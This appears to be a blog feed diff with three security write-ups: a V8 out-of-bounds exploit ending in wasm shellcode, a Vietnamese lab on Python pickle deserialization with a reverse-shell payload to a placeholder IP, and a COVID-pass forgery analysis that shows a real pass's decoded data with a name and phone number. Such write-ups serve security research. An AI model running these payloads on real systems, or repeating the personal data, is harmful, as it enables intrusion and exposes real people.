+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;oobRead&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;//optimize oobWrite&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;oobWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;//Restore map back to MapA, with SMI elements&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;oobRead&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;oobWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;When &lt;strong&gt;oobRead&lt;/strong&gt; and &lt;strong&gt;oobWrite&lt;/strong&gt; are optimized, &lt;strong&gt;x&lt;/strong&gt; now has &lt;strong&gt;MapB&lt;/strong&gt;, which is a stable map with &lt;strong&gt;HOLEY_DOUBLE_ELEMENTS&lt;/strong&gt;. This means that, for example, when writing to the 24th element (&lt;strong&gt;x[24]&lt;/strong&gt;) in &lt;strong&gt;oobWrite&lt;/strong&gt;, the offset used by the optimized code to access elements will be calculated with double element width, which is 8, so an offset of &lt;strong&gt;8 * 24&lt;/strong&gt; is used. However, when &lt;strong&gt;foo(arr)&lt;/strong&gt; is used to set &lt;strong&gt;x&lt;/strong&gt; back to &lt;strong&gt;arr&lt;/strong&gt;, the element store for arr is of type &lt;strong&gt;HOLEY_SMI_ELEMENTS&lt;/strong&gt;, which has a width of 4, meaning that the backing store is only &lt;strong&gt;4 * 30&lt;/strong&gt; bytes long, which is way smaller than &lt;strong&gt;8 * 24&lt;/strong&gt;. A write to the offset &lt;strong&gt;8 * 24&lt;/strong&gt; thus causes an out-of-bounds write in the backing store.&lt;/p&gt;
+
+&lt;p&gt;Using this &lt;strong&gt;OOB&lt;/strong&gt; read/write on JS array, we can get an arbitrary read/write primitive. The final step in obtaining code execution is to make use of the fact that &lt;strong&gt;wasm&lt;/strong&gt; (WebAssembly) stores its compiled code in an RWX region and the address of the compiled code is stored as a compressed pointer in the &lt;strong&gt;WebAssembly.Instance&lt;/strong&gt; object. Then, by using the arbitrary absolute address write primitive, we were able write shell code to this region and have it executed when we kicked off the compiled &lt;strong&gt;wasm&lt;/strong&gt; code.&lt;/p&gt;
+
+&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;
+
+&lt;p&gt;10/29/2021: Exploit submitted to Pwn2Own Competition&lt;/p&gt;
+
+&lt;p&gt;11/01/2021: Submission got rejected due to the usage of n-day&lt;/p&gt;</content><author><name>Chi Tran</name></author><category term="research" /><summary type="html">Overview</summary></entry><entry><title type="html">Python Deserialization on Integrated AWS DDB Flask App</title><link href="http://localhost:4000/bug-hunting/2021/12/19/python-deserialization-on-integrated-aws-ddb-flask-app.html" rel="alternate" type="text/html" title="Python Deserialization on Integrated AWS DDB Flask App" /><published>2021-12-19T00:00:00-06:00</published><updated>2021-12-19T00:00:00-06:00</updated><id>http://localhost:4000/bug-hunting/2021/12/19/python-deserialization-on-integrated-aws-ddb-flask-app</id><content type="html" xml:base="http://localhost:4000/bug-hunting/2021/12/19/python-deserialization-on-integrated-aws-ddb-flask-app.html">&lt;p&gt;Cách đây vài hôm mình có gặp một challenge hay ho khi làm Bug Bounty ở nền Cloud &amp;amp;&amp;amp; Web. Tuy flow xử lý data không có gì là mới, nhưng việc application sử dụng AWS DynamoDB để lưu trữ serialized data làm bug này trở nên thú vị hơn nhiều.&lt;/p&gt;
+
+&lt;h4 id=&quot;tiếp-cận&quot;&gt;Tiếp cận&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Như thường lệ, một trong những việc mà đa số ai cũng làm khi tiếp cận 1 website đó là kiểm tra sự tồn tại của folder /.git.&lt;/li&gt;
+  &lt;li&gt;Với trường hợp mình gặp cũng không ngoại lệ. .git được tải xuống và extract ra được file app.py với nội dung tương tự như sau (nội dung đã được mình chỉnh sửa để dựng lại lab thay vì sử dụng mã nguồn gốc)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/1*qUyMaO6pXSSxF6WlJd8r8g.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Mình note nhanh là mấy bạn đừng có cố gắng soi cái Access Key với Secret Key làm gì vì mình dựng lại bug này trên Dynamo Local. Nó không xài được trên AWS Console như 1 IAM Cred thiệt đâu.&lt;/li&gt;
+  &lt;li&gt;Đồng thời giao diện web như sau (mình cũng mode lại 1 Flask app khác để khác với submission thực tế, tuy nhiên đều cùng concept)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/1*ZrQBfd8GSwjZlFGH55Tb1A.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Main Page&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/1*dYHSD56WrNidmXgy4ajOlQ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sub-endpoint&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/1*wN4mOwiTegX80bY_UJ6wxw.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Customers endoint&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Điểm lưu ý đầu tiên, nội dung của customers.html này có đoạn như sau&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/1*bp2H3th35eUHnmfH09wMxg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Name và Description được lấy từ 1 JSON object pass từ main controller (app.py)&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Quay lại app.py, object data này được tạo ra như sau&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/1*VJwcZvcbDweTgONPJ-GYPA.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Workflow có thể hiểu như sau: Khi page được loaded, JSON object được parsed từ array data (app.py). Data này được hình thành bằng việc Scan Items từ DynamoDB table, item sau đó được decode và pickle load, cuối cùng lưu vào array.&lt;/li&gt;
+  &lt;li&gt;Điểm đáng chú ý thứ 2 là việc sử dụng Pickle để load data từ DynamoDB. Dẫn đến một hướng khai thác khả thi nhất để có thể RCE được đó là thay vì deserialize một item bình thường, bằng cách nào đó application sẽ deserialize payload reverse shell.&lt;/li&gt;
+  &lt;li&gt;Đối với giải pháp như vậy, việc đầu tiên cần làm đó là compromise được DynamoDB table, sau đó ghi vào trường data một payload RCE bằng API put_item() từ AWS CLI. Example:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;client.put_item( TableName = TABLE_NAME, Item={ ‘data’: {‘S’: data}, ‘Id’:{‘N’:1}} )&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Với việc AWS Credential bị exposed trong app.py, bước tiếp theo là xác định cấu trúc table. Một lưu ý đối với DynamoDB table là case-sensitive, có nghĩa là mọi item được ghi bằng code hay bằng AWS CLI đều phải chính xác từ chữ hoa đến chữ thường.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;exploit&quot;&gt;Exploit&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Bước 1&lt;/strong&gt;: Kiểm tra AWS creds có quyền đến những table nào&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;aws dynamodb list-tables — endpoint-url &lt;a href=&quot;http://localhost:8000&quot;&gt;http://localhost:8000&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/1*en5Ydy2eEcb2yHYBqSs1IQ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Bước 2&lt;/strong&gt;: Xác định cấu trúc Table customers&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;aws dynamodb scan — table-name customers — endpoint-url &lt;a href=&quot;http://localhost:8000&quot;&gt;http://localhost:8000&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/1*qEqqnWR782oJf6v1MTnmsw.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Table được cấu thành bởi trường &lt;strong&gt;Id&lt;/strong&gt; (&lt;strong&gt;Number&lt;/strong&gt;) là &lt;strong&gt;Partition Key&lt;/strong&gt;, và &lt;strong&gt;data&lt;/strong&gt; (&lt;strong&gt;String&lt;/strong&gt;) là serialized data.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Bước 3&lt;/strong&gt;: Exploit&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;boto3&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pickle&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RCE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;_&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_reduce&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;“””&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;“&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;**&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;\&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;“&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**/&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;\&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;“””&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; \&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_name&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_main&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pickled&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RCE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlsafe&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sample1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;“&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;utf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;“&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Payload&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;boto3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dynamodb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aws&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_access&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_key&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;access&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_key&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aws&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_secret&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_access&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_key&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;region&lt;/span&gt;\&lt;span class=&quot;n&quot;&gt;_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;us&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;east&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;, endpoint\_url=’[http://127.0.0.1:8000&apos;](http://127.0.0.1:8000%27) )
+
+client.put\_item( TableName=TABLE\_NAME, Item={ ‘data’: {‘S’:payload}, ‘Id’:{‘N’:1}} )&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Cuối cùng là reload lại endpoint để trigger insecure deserialization&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/1*jTfiSNvhuK9h7SKZ6OodLg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Good luck have fun!&lt;/strong&gt;&lt;/p&gt;</content><author><name>Chi Tran</name></author><category term="bug-hunting" /><summary type="html">Cách đây vài hôm mình có gặp một challenge hay ho khi làm Bug Bounty ở nền Cloud &amp;amp;&amp;amp; Web. Tuy flow xử lý data không có gì là mới, nhưng việc application sử dụng AWS DynamoDB để lưu trữ serialized data làm bug này trở nên thú vị hơn nhiều.</summary></entry><entry><title type="html">[English] How I faked tons of COVID passes — “Weak Key Cryptography in real world”</title><link href="http://localhost:4000/security-research/2021/09/29/weak-key-cryptography-in-real-world-english.html" rel="alternate" type="text/html" title="[English] How I faked tons of COVID passes — “Weak Key Cryptography in real world”" /><published>2021-09-29T00:00:00-05:00</published><updated>2021-09-29T00:00:00-05:00</updated><id>http://localhost:4000/security-research/2021/09/29/weak-key-cryptography-in-real-world-english</id><content type="html" xml:base="http://localhost:4000/security-research/2021/09/29/weak-key-cryptography-in-real-world-english.html">&lt;h3 id=&quot;i-summary&quot;&gt;I. SUMMARY&lt;/h3&gt;
+
+&lt;p&gt;Hanoi Police Department was using a QR generation system to provide COVID passes for its citizens to go out. The system was vulnerable to a weak key cryptography attack which may allow COVID patients to self-generate passes.&lt;/p&gt;
+
+&lt;h3 id=&quot;ii-analysis&quot;&gt;II. ANALYSIS&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;1.&lt;/strong&gt; &lt;strong&gt;QR DATA&lt;/strong&gt; Through news channels and social medias, we were able to find a sample COVID pass as below:&lt;/p&gt;
+
+&lt;p&gt;1 - Vehicle type&lt;/p&gt;
+
+&lt;p&gt;2 - License plate&lt;/p&gt;
+
+&lt;p&gt;3 - Seat #&lt;/p&gt;
+
+&lt;p&gt;4 - Vehicle operator&lt;/p&gt;
+
+&lt;p&gt;5 - Citizen ID&lt;/p&gt;
+
+&lt;p&gt;6 - Authorized zone&lt;/p&gt;
+
+&lt;p&gt;7 - Valid from/to (date)&lt;/p&gt;
+
+&lt;p&gt;8 - Valid from/to (time)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/1.jpg&quot; alt=&quot;&quot; /&gt; Source: &lt;a href=&quot;https://thanhtra.com.vn/xa-hoi/doi-song/ghi-nhan-trong-ngay-dau-ha-noi-thuc-hien-gian-cach-xa-hoi-phan-vung-187326.html&quot;&gt;https://thanhtra.com.vn/xa-hoi/doi-song/ghi-nhan-trong-ngay-dau-ha-noi-thuc-hien-gian-cach-xa-hoi-phan-vung-187326.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;As the QR code was not hidden, we were able to decode its information:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;**D9LOgcTFAS1MeC3kD4J+5PmAW5C4mOrPcbwbynsY6GEuGNkpe/dwIM5cr0MS/a+LT1y9z+8sKJA9UaPZTmYJwQ==&lt;/td&gt;
+      &lt;td&gt;**10505&lt;/td&gt;
+      &lt;td&gt;3&lt;/td&gt;
+      &lt;td&gt;06/09;07/09;08/09;09/09;10/09;11/09;12/09;13/09;14/09;15/09;16/09;17/09;18/09;19/09;20/09&lt;/td&gt;
+      &lt;td&gt;4_PHÒNG CẢNH SÁT GIAO THÔNG&lt;/td&gt;
+      &lt;td&gt;02439424451&lt;/td&gt;
+      &lt;td&gt;29G1–391.89&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;Vùng 1&lt;/td&gt;
+      &lt;td&gt;Nguyễn Ánh Ngọc&lt;/td&gt;
